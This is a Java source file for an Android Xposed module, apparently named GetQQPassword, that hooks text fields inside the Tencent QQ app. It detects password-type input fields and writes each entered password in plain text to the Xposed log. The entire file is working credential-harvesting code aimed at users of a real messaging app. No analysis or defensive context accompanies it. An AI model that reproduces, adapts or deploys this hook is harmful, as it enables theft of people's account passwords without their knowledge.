package space.kiya.xposedtools;
import android.widget.EditText;

import de.robv.android.xposed.IXposedHookLoadPackage;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.XposedBridge;
import de.robv.android.xposed.callbacks.XC_LoadPackage;

import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
/**
 * Created by kiya on 15-12-29.
 *
 */
public class GetQQPassword implements IXposedHookLoadPackage {
    @Override public void handleLoadPackage(XC_LoadPackage.LoadPackageParam loadPackageParam) throws Throwable {
        if (loadPackageParam.packageName.equals("com.tencent.mobileqq")){
            XposedBridge.log("found qq");
            findAndHookMethod("android.widget.EditText", loadPackageParam.classLoader, "getText", new XC_MethodHook() {
                @Override protected void afterHookedMethod(MethodHookParam param) throws Throwable {
                    Object v0 = param.thisObject;
                    if (v0 instanceof EditText){
                        if (((EditText)v0).getInputType() == 0x81){
                            if(!param.getResult().toString().equals(""))
                                XposedBridge.log("found pass:" + param.getResult().toString());
                        }
                    }
                }
            });
        }

    }
}
